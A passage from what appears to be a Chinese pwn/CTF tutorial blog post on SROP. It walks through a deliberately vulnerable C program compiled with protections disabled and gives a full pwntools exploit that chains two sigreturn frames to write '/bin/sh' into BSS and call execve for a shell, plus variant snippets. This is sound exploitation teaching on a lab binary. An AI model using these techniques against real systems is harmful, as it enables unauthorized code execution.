payload)</span></span><br><span class="line"><span class="string">q.interactive()</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/mainbackground/srop-02.png" alt="image"><br>这个是成功的标志。</p>
+<p><code>write</code> 执行后，程序可能因为没有安排后续返回流程而崩溃；这不影响本题验证 SROP 成功。先完成这一步，重点观察 <code>rax=15</code> 如何触发 sigreturn，以及 frame 如何设置下一次 <code>write</code> 调用。</p>
+<h1 id="用-SROP-自己写入-bin-sh-并调用-execve"><a href="#用-SROP-自己写入-bin-sh-并调用-execve" class="headerlink" title="用 SROP 自己写入 /bin/sh 并调用 execve"></a>用 SROP 自己写入 <code>/bin/sh</code> 并调用 <code>execve</code></h1><p>这篇实战完成一个目标：程序里不预先放置 <code>/bin/sh</code>，我们先通过 SROP 调用 <code>read</code>，把字符串写进 BSS；程序重新进入漏洞函数后，再通过第二份 SROP frame 调用 <code>execve</code>。<br>整个利用分成两阶段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一次溢出</span><br><span class="line">  └─ rt_sigreturn 恢复 read 参数</span><br><span class="line">       └─ read(0, bss_addr, 8)，把 &quot;/bin/sh\x00&quot; 写入 BSS</span><br><span class="line">            └─ syscall 返回后，gadget 跳回 main</span><br><span class="line"></span><br><span class="line">第二次溢出</span><br><span class="line">  └─ rt_sigreturn 恢复 execve 参数</span><br><span class="line">       └─ execve(bss_addr, NULL, NULL)，启动 shell</span><br></pre></td></tr></table></figure>
+<p>这里用到的自定义 gadget 是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">jmp main</span><br></pre></td></tr></table></figure>
+<p>它不是 <code>syscall; ret</code>。<code>syscall</code> 返回后，CPU 会顺着执行 <code>jmp main</code>。第一次调用的是 <code>read</code>，所以它返回后会跳回 <code>main</code>；第二次调用的是成功的 <code>execve</code>，进程被新程序替换，不会再执行 <code>jmp main</code>。</p>
+<h2 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 预留一块可写的 BSS，分别放路径字符串和 fake stack */</span></span><br><span class="line"><span class="type">char</span> bss_space[<span class="number">0x3000</span>];</span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_pop_rax</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;pop %rax\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_syscall_jmp_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;syscall\n\tjmp main&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>buf</code> 只有 64 字节，但 <code>read</code> 最多读取 512 字节，因此可以覆盖保存的返回地址。这里假设我们已经通过 cyclic pattern 和 GDB 确认，从 <code>buf</code> 起始位置到返回地址的偏移是 72 字节。<br>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc sropexe.c -o sropexe \</span><br><span class="line">    -fno-stack-protector \</span><br><span class="line">    -fno-pie -no-pie \</span><br><span class="line">    -fcf-protection=none \</span><br><span class="line">    -Wl,-z,norelro</span><br></pre></td></tr></table></figure>
+<h2 id="为什么需要两份-SROP-frame"><a href="#为什么需要两份-SROP-frame" class="headerlink" title="为什么需要两份 SROP frame"></a>为什么需要两份 SROP frame</h2><p>Linux amd64 系统调用通过寄存器传参：</p>
+<table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>rax</code></td>
+<td>系统调用号</td>
+</tr>
+<tr>
+<td><code>rdi</code></td>
+<td>第 1 个参数</td>
+</tr>
+<tr>
+<td><code>rsi</code></td>
+<td>第 2 个参数</td>
+</tr>
+<tr>
+<td><code>rdx</code></td>
+<td>第 3 个参数</td>
+</tr>
+</tbody></table>
+<p>第一阶段要执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, bss_addr, 8);</span><br></pre></td></tr></table></figure>
+<p>因此需要设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0       read 的系统调用号</span><br><span class="line">rdi = 0       标准输入</span><br><span class="line">rsi = bss_addr</span><br><span class="line">rdx = 8       读取 8 字节</span><br></pre></td></tr></table></figure>
+<p>第二阶段要执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(bss_addr, NULL, NULL);</span><br></pre></td></tr></table></figure>
+<p>因此需要设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 59      execve 的系统调用号</span><br><span class="line">rdi = bss_addr</span><br><span class="line">rsi = 0</span><br><span class="line">rdx = 0</span><br></pre></td></tr></table></figure>
+<p>一个 frame 只能在一次 <code>rt_sigreturn</code> 中恢复一组寄存器状态。本题的第一份 frame 用来执行 <code>read</code>，第二份 frame 用来执行 <code>execve</code>。</p>
+<h2 id="第一阶段：把-bin-sh-写到-BSS"><a href="#第一阶段：把-bin-sh-写到-BSS" class="headerlink" title="第一阶段：把 /bin/sh 写到 BSS"></a>第一阶段：把 <code>/bin/sh</code> 写到 BSS</h2><p>用 pwntools 的 <code>SigreturnFrame</code> 构造内核恢复寄存器时要读取的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 0</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = bss_addr</span><br><span class="line">frame.rdx = 8</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">frame.rsp = fake_stack</span><br></pre></td></tr></table></figure>
+
+<p>这里各字段的含义：</p>
+<ul>
+<li><code>frame.rip</code>：<code>rt_sigreturn</code> 恢复完寄存器后，从哪里继续执行。设为 syscall\n\tjmp main，恢复后就会再次执行 gadget 里的 <code>syscall</code>，这次执行 <code>read</code>。</li>
+<li><code>frame.rsp</code>：恢复后的栈指针。<code>read</code> 返回后 gadget 会跳到 <code>main</code>，<code>main</code> 和它调用的函数还需要一个有效栈，所以要把 <code>rsp</code> 指向可写的 BSS 区域。</li>
+</ul>
+<p><code>bss_addr</code> 和 <code>fake_stack</code> 用途不同：前者存放 <code>/bin/sh\x00</code>，后者提供重新进入 <code>main</code> 后使用的栈空间，二者应当分开。</p>
+<h2 id="完整利用脚本"><a href="#完整利用脚本" class="headerlink" title="完整利用脚本"></a>完整利用脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">qjzhalx = process(&quot;./sropexe&quot;)</span><br><span class="line">elf = ELF(&#x27;./sropexe&#x27;)</span><br><span class="line">offset = 72</span><br><span class="line">pop_rax = elf.sym[&#x27;gadget_pop_rax&#x27;]</span><br><span class="line">syscall_ret = elf.sym[&#x27;gadget_syscall_jmp_main&#x27;]</span><br><span class="line">bss_addr = elf.bss(0x800)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 0</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = bss_addr</span><br><span class="line">frame.rdx = 8</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">frame.rsp = elf.bss(0x2800)</span><br><span class="line">payload = flat(</span><br><span class="line">    b&#x27;A&#x27; * offset,</span><br><span class="line">    pop_rax,</span><br><span class="line">    15,          </span><br><span class="line">    syscall_ret,</span><br><span class="line">    bytes(frame)</span><br><span class="line">)</span><br><span class="line">qjzhalx.sendlineafter(b&#x27;Input:\n&#x27;, payload)</span><br><span class="line">qjzhalx.send(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 59</span><br><span class="line">frame.rdi = bss_addr</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">payload1 = flat(</span><br><span class="line">    b&#x27;A&#x27; * offset,</span><br><span class="line">    pop_rax,</span><br><span class="line">    15,          </span><br><span class="line">    syscall_ret,</span><br><span class="line">    bytes(frame)</span><br><span class="line">)</span><br><span class="line">qjzhalx.sendlineafter(b&#x27;Input:\n&#x27;, payload1)</span><br><span class="line">qjzhalx.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/mainbackground/srop-03.png" alt="image"><br>本例在 Linux 上使用 <code>execve(path, NULL, NULL)</code>。做题时要确认目标环境允许这种参数形式；更通用的写法是把 <code>argv</code> 和 <code>envp</code> 指针数组也放到可写内存中。</p>
+<h2 id="第一份-payload-的栈布局"><a href="#第一份-payload-的栈布局" class="headerlink" title="第一份 payload 的栈布局"></a>第一份 payload 的栈布局</h2><p>第一阶段的 payload 大致是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf 开始</span><br><span class="line">│</span><br><span class="line">├── &#x27;A&#x27; * 72</span><br><span class="line">├── gadget_pop_rax 的地址</span><br><span class="line">├── 15</span><br><span class="line">├── gadget_syscall_jmp_main 的地址</span><br><span class="line">└── SigreturnFrame 的字节内容</span><br></pre></td></tr></table></figure>
+<p>控制流如下</p>
+<ol>
+<li><code>vuln</code> 执行 <code>ret</code>，跳到 <code>gadget_pop_rax</code>。</li>
+<li><code>pop rax</code> 取出 <code>15</code>，即 <code>rt_sigreturn</code> 系统调用号。</li>
+<li><code>ret</code> 跳到 <code>gadget_syscall_jmp_main</code>。</li>
+<li>gadget 中的 <code>syscall</code> 执行 <code>rt_sigreturn</code>。</li>
+<li>内核把栈上的 <code>SigreturnFrame</code> 当作寄存器现场恢复，设置 <code>rax=0</code>、<code>rdi=0</code>、<code>rsi=bss_addr</code>、<code>rdx=8</code>、<code>rip=syscall_gadget</code> 等。</li>
+<li>恢复后从 <code>syscall_gadget</code> 开始执行。它的 <code>syscall</code> 现在执行 <code>read(0, bss_addr, 8)</code>。</li>
+<li><code>read</code> 收到 <code>/bin/sh\x00</code> 后返回，随后 gadget 执行 <code>jmp main</code>。</li>
+</ol>
+<p>要注意：<code>SigreturnFrame</code> 是给内核读取的<strong>数据</strong>，不是 CPU 逐条执行的指令。触发 SROP 的 <code>syscall</code> 指令已经在 gadget 里了；frame 的 <code>rip</code> 则决定恢复后从哪里继续执行。</p>
+<h2 id="为什么-frame-rsp-也要设置"><a href="#为什么-frame-rsp-也要设置" class="headerlink" title="为什么 frame.rsp 也要设置"></a>为什么 <code>frame.rsp</code> 也要设置</h2><p><code>rt_sigreturn</code> 恢复的不只是 <code>rax</code>、<code>rdi</code>、<code>rsi</code>、<code>rdx</code> 和 <code>rip</code>，还包括 <code>rsp</code>。<br>第一次 SROP 完成后，程序会执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp main</span><br></pre></td></tr></table></figure>
+<p><code>jmp</code> 不会像 <code>call</code> 一样自动压入返回地址。重新进入 <code>main</code> 后，函数还会建立栈帧并调用 <code>vuln</code>，所以必须确保恢复的 <code>rsp</code> 指向一段有效、可写的内存，并且栈对齐符合函数入口约定。否则即使 <code>read</code> 成功，跳回 <code>main</code> 后也可能崩溃。<br><code>bss_addr</code> 是路径字符串的位置；<code>fake_stack</code> 是重新进入程序后用作栈的位置。两者应该分开规划。</p>
+<h2 id="没有jmp-main怎么办"><a href="#没有jmp-main怎么办" class="headerlink" title="没有jmp main怎么办"></a>没有jmp main怎么办</h2><p>没有 <code>jmp main</code> 时，需要给第一次 SROP 准备一条<strong>返回到 <code>main</code> 的后续控制流</strong>。常见做法是让 <code>syscall</code> 后执行 <code>ret</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>不过，光把 gadget 换成 <code>syscall; ret</code> 还不够：<code>ret</code> 会从当前 <code>rsp</code> 指向的位置弹出下一条地址。因此需要同时布置好返回地址。</p>
+<p>对于这题，第一份 frame 恢复后执行 <code>read</code>。<code>read</code> 返回时会继续执行 <code>syscall; ret</code> 里的 <code>ret</code>。可以让 <code>frame.rsp</code> 指向 BSS 中预先放好的一个指针，而这个指针是 <code>main</code> 的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">return_slot = elf.bss(0x2800)</span><br><span class="line">fake_stack = (return_slot &amp; ~0xf) + 8</span><br><span class="line"></span><br><span class="line"># 在 return_slot 处预先布置 main 地址</span><br><span class="line">io先把 p64(elf.sym[&#x27;main&#x27;]) 写到 return_slot</span><br></pre></td></tr></table></figure>
+<p>但这个伪代码有个重要的时序问题：第一次 SROP 的 <code>read</code> 也要读 <code>/bin/sh</code>，不能同时把 <code>main</code> 地址写到另一个 BSS 位置，除非额外安排一次写入或让第一次 <code>read</code> 的目标布局同时包含两者。<br>一个简单的布局是让第一次 <code>read</code> 把路径和返回地址一起写入 BSS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">path_addr = elf.bss(0x800)</span><br><span class="line">return_slot = path_addr + 0x20</span><br><span class="line"></span><br><span class="line"># read 读入的内容：</span><br><span class="line">#   path_addr:   &quot;/bin/sh\x00&quot;</span><br><span class="line">#   return_slot: p64(main)</span><br><span class="line">stage_data = flat(</span><br><span class="line">    b&#x27;/bin/sh\x00&#x27;,</span><br><span class="line">    b&#x27;\x00&#x27; * (0x20 - 8),</span><br><span class="line">    elf.sym[&#x27;main&#x27;]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>对应的 SROP frame 要把 <code>read</code> 长度改成覆盖到 <code>return_slot</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame_read.rax = 0</span><br><span class="line">frame_read.rdi = 0</span><br><span class="line">frame_read.rsi = path_addr</span><br><span class="line">frame_read.rdx = len(stage_data)</span><br><span class="line">frame_read.rip = syscall_ret</span><br><span class="line">frame_read.rsp = return_slot</span><br></pre></td></tr></table></figure>
+<p>执行过程是</p>
+<ol>
+<li><code>rt_sigreturn</code> 恢复到 <code>syscall; ret</code>。</li>
+<li>gadget 的 <code>syscall</code> 执行 <code>read(0, path_addr, len(stage_data))</code>。</li>
+<li><code>read</code> 把 <code>/bin/sh\x00</code> 和 <code>main</code> 地址一起写进 BSS。</li>
+<li><code>read</code> 返回，执行 <code>ret</code>。</li>
+<li><code>ret</code> 从 <code>frame_read.rsp</code> 指向的位置取出 <code>main</code> 地址并跳过去。</li>
+</ol>
+<p>别再让等等耗尽你所有的可能。<br>不要把梦想留给未来的某一天，现在就是开始的时刻。<br><strong>Don’t let someday steal all your possibilities.</strong><br><strong>Start now, keep moving, and become who you want to be.</strong></p>
+<p>—— yanami</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/SROP/">SROP</a></div><div class="post-share"><div class="social-share" data-image="/img/yanami16.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/" title="ORW 入门：用 ROP 打开、读取并输出文件"><img class="cover" src="/img/yanami15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ORW 入门：用 ROP 打开、读取并输出文件</div></div><div class="info-2"><div class="info-item-1">ORW 是 Pwn 中常见的一种利用方式，名字来自三个函数： 123O：open   打开文件R：read   读取文件W：write  输出内容 它的目标是利用程序中的漏洞，让程序打开一个文件，把文件内容读入内存，再输出到终端。本篇先讲清楚 ORW 的工作原理，再通过栈溢出题目实际构造 ROP 链。实战目录中会放置 flag.txt 作为目标文件；利用时仍然会先把字符串 flag.txt\0 写入 .bss，再从 .bss 传给 open()。 ORW 原理普通程序如何读取文件如果不考虑漏洞，普通 C 程序可以这样读取文件： 123456int fd = open(&quot;flag.txt&quot;, 0);char buffer[256];int n = read(fd, buffer, sizeof(buffer));write(1, buffer, n); 执行顺序是 12345open(&quot;flag.txt&quot;, 0)        ↓read(fd, buffer, 256)        ↓write(1, buffer, n) 三个函数分工明...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/09/21/ret2syscall%20%E5%85%A5%E9%97%A8%EF%BC%9A%E9%80%9A%E8%BF%87%20execve%20%E8%8E%B7%E5%8F%96%20Shell/" title="ret2syscall 入门：通过 execve 获取 Shell"><img class="cover" src="/img/yanami7.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-21</div><div class="info-item-2">ret2syscall 入门：通过 execve 获取 Shell</div></div><div class="info-2"><div class="info-item-1">ret2syscall 的第一个经典目标，就是通过 ROP 调用 Linux 的 execve 系统调用： 1execve(&quot;/bin/sh&quot;, 0, 0); 成功后，当前进程会被替换成 /bin/sh，从而获得 Shell。 execve 到底是什么在 C 语言中，函数原型是： 12345int execve(    const char *pathname,    char *const argv[],    char *const envp[]); 例如 1execve(&quot;/bin/sh&quot;, NULL, NULL); 它的含义是：  执行 /bin/sh 参数列表为空 环境变量列表为空需要注意，execve 并不是创建一个新进程，而是直接替换当前进程的代码、数据和执行内容。如果调用成功  1原程序进程 → /bin/sh 原来的程序不会继续执行，因此通常也不会返回到原来的 main 函数。如果调用失败，才会返回 -1。 ret2libc 和 ret2syscall 的区别在 ret2libc 中，我们通常调用 1system(&quo...</div></div></div></a><a class="pagination-related" href="/2026/09/15/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/" title="初识栈溢出：Pwn 入门基础"><img class="cover" src="/img/huaban.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-15</div><div class="info-item-2">初识栈溢出：Pwn 入门基础</div></div><div class="info-2"><div class="info-item-1">什么是栈？在程序运行过程中，内存通常被划分为：其中：  代码段（Text）：保存程序指令 数据段（Data）：保存全局变量 堆（Heap）：动态申请内存 栈（Stack）：保存函数调用信息Pwn 中最早接触的漏洞，大部分来自：   栈上的局部变量没有限制大小，导致覆盖重要数据。  栈的特点栈有两个重要特点：（1）后进先出例如： 123push Apush Bpush C 栈：执行： 1pop 取出的： 1C （2）向低地址增长 假设： 12345高地址0x10000x0ff00x0fe0低地址 压入数据： 1push 实际上： 1RSP下降 例如： 1push rax 执行： 12rsp = rsp - 8[rsp]=rax 所以： 12345678高地址旧数据↓新数据低地址 什么是函数栈帧（Stack Frame）每调用一个函数，系统都会为它创建一个空间。例如： 1234void func()&#123;&#125; 调用： 12345main()   |   |   vfunc() 进入 func： 1创建 func 的栈帧 64位函数调用栈结构例如： 1234void fu...</div></div></div></a><a class="pagination-related" href="/2026/10/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E6%88%98%EF%BC%9A%E8%A6%86%E7%9B%96%20exit@got%20%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/" title="格式化字符串实战：覆盖 exit@got 劫持程序流程"><img class="cover" src="/img/yanami13.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-06</div><div class="info-item-2">格式化字符串实战：覆盖 exit@got 劫持程序流程</div></div><div class="info-2"><div class="info-item-1">上一篇已经学习了如何使用格式化字符串漏洞，通过 %n 修改 GOT。本篇进行一个更加接近 CTF 的实战题。与前面的练习相比，这道题有几个变化：  不再直接覆盖 puts@got； 程序只有一次输入机会； 程序开启 Canary； 程序使用 Partial RELRO； 目标函数不会被正常调用； 需要覆盖 exit@got，等待程序退出时触发 win； 需要使用 GDB 分析 GOT，而不是只观察栈。最终利用链如下  1234567891011121314151617printf(buf)        ↓确定格式化字符串 offset        ↓找到 exit@got        ↓找到 win 地址        ↓使用 %hn 修改 exit@got        ↓程序执行 exit(0)        ↓exit@plt 从 GOT 取到 win        ↓执行 win()        ↓读取 flag 题目源码1234567891011121314151617181920212223242526272829303132333435#include &l...</div></div></div></a><a class="pagination-related" href="/2026/09/14/WSL2-vscode%E9%85%8D%E7%BD%AE%E5%9F%BA%E7%A1%80pwn%E7%8E%AF%E5%A2%83/" title="WSL2+vscode配置基础pwn环境"><img class="cover" src="/2026/09/14/WSL2-vscode%E9%85%8D%E7%BD%AE%E5%9F%BA%E7%A1%80pwn%E7%8E%AF%E5%A2%83/3.2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-14</div><div class="info-item-2">WSL2+vscode配置基础pwn环境</div></div><div class="info-2"><div class="info-item-1">检查虚拟化WSL2 需要 CPU 虚拟化打开任务管理器，查看性能看看右下角是否为虚拟化  这里如果是已禁用我建议进入BIOS开：AMD:SVM Mode 开启Windows功能管理员打开powershell执行 1dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart 然后输入 1dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart 重启一下电脑 安装 WSL2这里我们来安装ubuntu22.04首先我们先更新一下wsl 1wsl --update  重启一下wsl 1wsl --shutdown 查看可用的版本 1wsl --list --online  这里我们安装ubuntu-22.04命令如下 1wsl --install -d Ubuntu-22.04 看powershell这里会出现Create a default Un...</div></div></div></a><a class="pagination-related" href="/2026/09/20/Pwn%20%E5%9F%BA%E7%A1%80%EF%BC%9AELF%E3%80%81PLT%E3%80%81GOT%20%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88/" title="Pwn 基础：ELF、PLT、GOT 到底是什么"><img class="cover" src="/img/yanami3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-20</div><div class="info-item-2">Pwn 基础：ELF、PLT、GOT 到底是什么</div></div><div class="info-2"><div class="info-item-1">ELF 是什么我们平时编译出来的 Linux 可执行文件，比如 1gcc pwn.c -o pwn 生成的 pwn，通常就是一个 ELF 文件。ELF 全称 1Executable and Linkable Format 可以简单理解成：  Linux 下可执行文件、目标文件、动态库的一种标准格式。  一个 ELF 文件里面不是只有“代码”，而是分成很多区域。我们现在最需要认识这几个 1234567ELF├── .text├── .data├── .bss├── .rodata├── .plt└── .got 我们要先记住用途    区域 作用    .text 程序代码   .data 已初始化的全局变量   .bss 未初始化的全局变量   .rodata 只读数据，比如字符串   .plt 用来“跳转调用动态库函数”   .got 保存动态库函数的真实地址   这里 Pwn 最重要的是 12.plt.got 为什么需要 PLT 和 GOT假设有这样一个程序 123456#include &lt;stdio.h&gt;int main() &#123;    puts(&qu...</div></div></div></a><a class="pagination-related" href="/2026/09/19/canary%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E6%AC%A1/" title="Canary 学习第二次：利用 puts 泄露 Canary"><img class="cover" src="/img/yanami.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-19</div><div class="info-item-2">Canary 学习第二次：利用 puts 泄露 Canary</div></div><div class="info-2"><div class="info-item-1">上次我们学习的是有write来获得canary的题目，那个感觉好死板有感觉吗。这次八奈见带大家学put泄露canary的题目 源码123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void win()&#123;    puts(&quot;You win!&quot;);    system(&quot;/bin/sh&quot;);&#125;void vuln()&#123;    char buf[64];    volatile int marker = 0x12345678;    puts(&quot;leak:&quot;);    read(0, buf, 200);    puts(buf);    puts(&quot;payload:&quot;);    read(0, buf, 200);    if (marker == 0xdeadbeef)        put...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Anna Yanami</div><div class="author-info-description">Cyber Security Learner
+CTF Player | AI Security Researcher
